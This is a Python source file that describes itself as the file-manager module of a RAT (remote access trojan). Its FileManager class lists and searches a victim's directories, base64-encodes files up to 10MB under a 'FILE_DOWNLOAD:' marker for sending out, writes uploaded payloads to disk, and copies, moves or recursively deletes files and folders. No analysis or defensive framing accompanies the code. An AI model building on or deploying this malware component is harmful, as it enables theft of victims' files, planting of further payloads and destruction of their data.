#!/usr/bin/env python3
"""
FILE MANAGER MODULE FOR RAT
"""

import os
import shutil
import stat
import hashlib
from pathlib import Path
import base64

class FileManager:
    def __init__(self, base_path=None):
        self.base_path = base_path or os.getcwd()
        
    def list_directory(self, path="."):
        """List directory contents with detailed information"""
        try:
            if not path or path == ".":
                path = self.base_path
            else:
                path = os.path.abspath(os.path.join(self.base_path, path))
            
            if not os.path.exists(path):
                return f"Error: Path does not exist: {path}"
            
            if not os.path.isdir(path):
                return f"Error: Not a directory: {path}"
            
            items = []
            total_size = 0
            total_files = 0
            total_dirs = 0
            
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat_info = os.stat(item_path)
                    
                    item_type = 'DIR' if os.path.isdir(item_path) else 'FILE'
                    size = stat_info.st_size
                    permissions = stat.filemode(stat_info.st_mode)
                    modified = stat_info.st_mtime
                    
                    items.append({
                        'name': item,
                        'type': item_type,
                        'size': size,
                        'permissions': permissions,
                        'modified': modified
                    })
                    
                    if item_type == 'FILE':
                        total_size += size
                        total_files += 1
                    else:
                        total_dirs += 1
                        
                except Exception as e:
                    items.append({
                        'name': item,
                        'type': 'ERROR',
                        'size': 0,
                        'permissions': '??????????',
                        'modified': 0,
                        'error': str(e)
                    })
            
            # Sort items: directories first, then files, alphabetically
            items.sort(key=lambda x: (x['type'] != 'DIR', x['name'].lower()))
            
            # Format output
            output = f"Directory: {path}\n"
            output += f"Total: {len(items)} items ({total_dirs} directories, {total_files} files, {total_size} bytes)\n"
            output += "-" * 80 + "\n"
            output += "Permissions Size     Modified            Name\n"
            output += "-" * 80 + "\n"
            
            for item in items:
                if item['type'] == 'ERROR':
                    output += f"{item['permissions']} {'ERROR':>8} {'':18} {item['name']} ({item.get('error', 'Unknown error')})\n"
                else:
                    size_str = f"{item['size']:>8}" if item['type'] == 'FILE' else "<DIR>   "
                    from datetime import datetime
                    modified_str = datetime.fromtimestamp(item['modified']).strftime("%Y-%m-%d %H:%M:%S")
                    output += f"{item['permissions']} {size_str} {modified_str} {item['name']}\n"
            
            return output
            
        except Exception as e:
            return f"Error listing directory: {str(e)}"

    def download_file(self, file_path):
        """Prepare file for download with metadata"""
        try:
            if not file_path or file_path == ".":
                return "Error: No file specified"
            
            abs_path = os.path.abspath(os.path.join(self.base_path, file_path))
            
            if not os.path.exists(abs_path):
                return f"Error: File not found: {file_path}"
            
            if os.path.isdir(abs_path):
                return "Error: Cannot download directory (use archive instead)"
            
            # Get file info
            stat_info = os.stat(abs_path)
            file_size = stat_info.st_size
            
            # Check if file is too large (e.g., > 10MB)
            if file_size > 10 * 1024 * 1024:
                return f"Error: File too large ({file_size} bytes). Maximum size is 10MB."
            
            # Read and encode file
            with open(abs_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Calculate checksum
            with open(abs_path, 'rb') as f:
                file_hash = hashlib.md5(f.read()).hexdigest()
            
            response = {
                'status': 'success',
                'filename': os.path.basename(abs_path),
                'size': file_size,
                'md5': file_hash,
                'data': file_data
            }
            
            return f"FILE_DOWNLOAD:{base64.b64encode(str(response).encode()).decode()}"
            
        except Exception as e:
            return f"Download error: {str(e)}"

    def upload_file(self, filename, file_data_b64):
        """Handle file upload"""
        try:
            if not filename or not file_data_b64:
                return "Error: Missing filename or file data"
            
            abs_path = os.path.abspath(os.path.join(self.base_path, filename))
            
            # Ensure directory exists
            os.makedirs(os.path.dirname(abs_path), exist_ok=True)
            
            # Decode and write file
            file_data = base64.b64decode(file_data_b64)
            
            with open(abs_path, 'wb') as f:
                f.write(file_data)
            
            # Verify file was written
            if os.path.exists(abs_path):
                file_size = os.path.getsize(abs_path)
                return f"Upload successful: {filename} ({file_size} bytes)"
            else:
                return "Error: File upload failed - file not created"
                
        except Exception as e:
            return f"Upload error: {str(e)}"

    def search_files(self, pattern, search_path="."):
        """Search for files matching pattern"""
        try:
            abs_path = os.path.abspath(os.path.join(self.base_path, search_path))
            
            if not os.path.exists(abs_path):
                return f"Error: Search path does not exist: {search_path}"
            
            matches = []
            
            for root, dirs, files in os.walk(abs_path):
                for file in files:
                    if pattern.lower() in file.lower():
                        full_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(full_path)
                            matches.append({
                                'path': full_path,
                                'size': file_size
                            })
                        except:
                            matches.append({
                                'path': full_path,
                                'size': 'Unknown'
                            })
            
            if not matches:
                return f"No files found matching: {pattern}"
            
            output = f"Search results for '{pattern}' in {search_path}:\n"
            output += "-" * 60 + "\n"
            
            for match in matches[:20]:  # Limit to first 20 results
                output += f"{match['path']} ({match['size']} bytes)\n"
            
            if len(matches) > 20:
                output += f"... and {len(matches) - 20} more results\n"
            
            return output
            
        except Exception as e:
            return f"Search error: {str(e)}"

    def file_operations(self, operation, source, destination=None):
        """Perform file operations (copy, move, delete, etc.)"""
        try:
            source_path = os.path.abspath(os.path.join(self.base_path, source))
            
            if operation == 'delete':
                if os.path.isdir(source_path):
                    shutil.rmtree(source_path)
                    return f"Directory deleted: {source}"
                else:
                    os.remove(source_path)
                    return f"File deleted: {source}"
            
            elif operation == 'copy':
                if not destination:
                    return "Error: Destination required for copy operation"
                
                dest_path = os.path.abspath(os.path.join(self.base_path, destination))
                
                if os.path.isdir(source_path):
                    shutil.copytree(source_path, dest_path)
                    return f"Directory copied: {source} -> {destination}"
                else:
                    shutil.copy2(source_path, dest_path)
                    return f"File copied: {source} -> {destination}"
            
            elif operation == 'move':
                if not destination:
                    return "Error: Destination required for move operation"
                
                dest_path = os.path.abspath(os.path.join(self.base_path, destination))
                shutil.move(source_path, dest_path)
                return f"Moved: {source} -> {destination}"
            
            elif operation == 'mkdir':
                os.makedirs(source_path, exist_ok=True)
                return f"Directory created: {source}"
            
            else:
                return f"Error: Unknown operation: {operation}"
                
        except Exception as e:
            return f"File operation error: {str(e)}"

# Example usage
if __name__ == "__main__":
    fm = FileManager()
    
    # Test directory listing
    print(fm.list_directory())
    
    # Test search
    print(fm.search_files(".py"))